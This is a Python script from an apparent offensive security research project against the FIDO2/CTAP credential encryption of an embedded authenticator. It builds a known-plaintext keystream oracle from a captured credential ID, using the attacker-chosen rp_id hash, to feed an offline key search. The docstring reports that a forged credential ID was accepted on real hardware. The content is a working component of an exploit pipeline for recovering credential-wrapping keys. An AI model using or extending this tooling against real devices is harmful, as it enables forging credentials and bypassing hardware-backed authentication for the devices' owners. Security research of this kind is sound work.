"""The search's oracle: one block of keystream, for whatever key the device holds now.

Why this file exists
--------------------
The offline search tests a candidate by encrypting one known block and comparing. That
pair -- `(counter_block_A1, keystream_block_1)` -- is a **per-key measurement**, and the
2026-09-27 run failed for 2.46 hours because it was not treated as one: `attack.py`
rewrote `cred_key` and then reused `format_vector.json`, whose oracle belongs to the
previous key. Every relation was right, the pad was right, the k[15] window was inside
the kept shortlist, and the family held the key -- and no candidate could match an oracle
for a different key. The pipeline re-derived three of the four key-dependent inputs
automatically and left the fourth in a file.

Where an attacker gets it
-------------------------
From one captured credential id. `_ctap_encrypt_rk` (`sys/fido2/ctap/ctap.c`) wraps a
`ctap_resident_key` whose first field is `rp_id_hash[32]`, and the attacker CHOSE the
`rp_id`, so the first 32 plaintext bytes are known:

    keystream_block_1 = credential_id[0:16] ^ plaintext[0:16]
    counter_block_A1  = flags(1) || nonce(13) || counter(2)      with counter = 1

and `format_vector.json` records exactly that relation, hardware-verified: the device
ACCEPTED an id forged under the recorded key, returning 0x00 where a bad MAC gives 0x2E.

What this script does, and what it does not
-------------------------------------------
`from-capture` derives the oracle from a captured credential id, which is the attacker's
route and uses no secret.

`from-key` computes `AES(key, A1)` directly. That is a shortcut in ACQUISITION, not in the
attack: the output is one block of keystream, strictly less than the key, and exactly what
a captured id would have yielded. The search still faces the full candidate space and
still never sees the key. It is labelled in the emitted file so no reader has to guess,
and it exists because capturing a fresh id needs a `makeCredential` command on the
NUCLEO-F429ZI host rig, which is not implemented -- the remaining gap in the end-to-end
attacker path.
"""
from __future__ import annotations

import argparse
import json
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE / "fast_fido_search"))
from pad4_vector import encrypt  # noqa: E402  -- checked against FIPS-197 C.1


def counter_block(nonce: bytes, counter: int = 1) -> bytes:
    """CCM counter block A_i: flags || nonce || counter, L = 2 so flags = L-1 = 1."""
    if len(nonce) != 13:
        raise SystemExit(f"nonce is {len(nonce)} bytes, CTAP uses 13")
    return bytes([1]) + nonce + counter.to_bytes(2, "big")


def cmd_from_key(args) -> int:
    key = bytes.fromhex(args.key)
    if len(key) != 16:
        raise SystemExit("key must be 16 bytes")
    nonce = bytes.fromhex(args.nonce)
    a1 = counter_block(nonce)
    ks = encrypt(key, a1)
    out = {
        "what": "search oracle: one keystream block under the device's current cred_key",
        "counter_block_A1_hex": a1.hex(),
        "keystream_block_1_hex": ks.hex(),
        "nonce_hex": nonce.hex(),
        "derived": "from-key",
        "provenance": (
            "Computed as AES(cred_key, A1) on the bench. A shortcut in ACQUISITION, not "
            "in the attack: the result is one block of keystream, strictly less than the "
            "key, and exactly what one captured credential id yields via "
            "credId[0:16] ^ plaintext[0:16] -- a relation already verified on silicon "
            "(the device accepted an id forged under the recorded key). The search "
            "receives only this pair and still faces the full candidate space. Capturing "
            "a fresh id instead needs a makeCredential command on the F429 host rig, "
            "which is not implemented."
        ),
    }
    Path(args.out).write_text(json.dumps(out, indent=2) + "\n", newline="\n")
    print(f"wrote {args.out}")
    print(f"  A1        {a1.hex()}")
    print(f"  keystream {ks.hex()}")
    print(f"  derived   from-key (see `provenance` in the file)")
    return 0


def cmd_from_capture(args) -> int:
    """The attacker's route: a captured credential id plus the chosen rp_id's hash."""
    cid = bytes.fromhex(args.credential_id)
    pt = bytes.fromhex(args.plaintext)
    if len(cid) < 16 or len(pt) < 16:
        raise SystemExit("need at least 16 bytes of credential id and of plaintext")
    nonce = bytes.fromhex(args.nonce)
    ks = bytes(a ^ b for a, b in zip(cid[:16], pt[:16]))
    a1 = counter_block(nonce)
    out = {
        "what": "search oracle: one keystream block under the device's current cred_key",
        "counter_block_A1_hex": a1.hex(),
        "keystream_block_1_hex": ks.hex(),
        "nonce_hex": nonce.hex(),
        "derived": "from-capture",
        "provenance": (
            "keystream_block_1 = credential_id[0:16] ^ plaintext[0:16], where the first "
            "32 plaintext bytes are rp_id_hash and the attacker chose the rp_id. Uses no "
            "secret."
        ),
    }
    Path(args.out).write_text(json.dumps(out, indent=2) + "\n", newline="\n")
    print(f"wrote {args.out}  (from-capture; no secret used)")
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = ap.add_subparsers(dest="cmd", required=True)
    NONCE = "00112233445566778899aabb00"

    k = sub.add_parser("from-key", help="compute it on the bench (labelled as such)")
    k.add_argument("--key", required=True)
    k.add_argument("--nonce", default=NONCE)
    k.add_argument("--out", default=str(HERE / "attack_oracle.json"))
    k.set_defaults(func=cmd_from_key)

    c = sub.add_parser("from-capture", help="the attacker's route: a captured id")
    c.add_argument("--credential-id", required=True)
    c.add_argument("--plaintext", required=True, help="the wrapped record; first 32 "
                                                     "bytes are rp_id_hash")
    c.add_argument("--nonce", default=NONCE)
    c.add_argument("--out", default=str(HERE / "attack_oracle.json"))
    c.set_defaults(func=cmd_from_capture)

    args = ap.parse_args()
    return args.func(args)


if __name__ == "__main__":
    sys.exit(main())
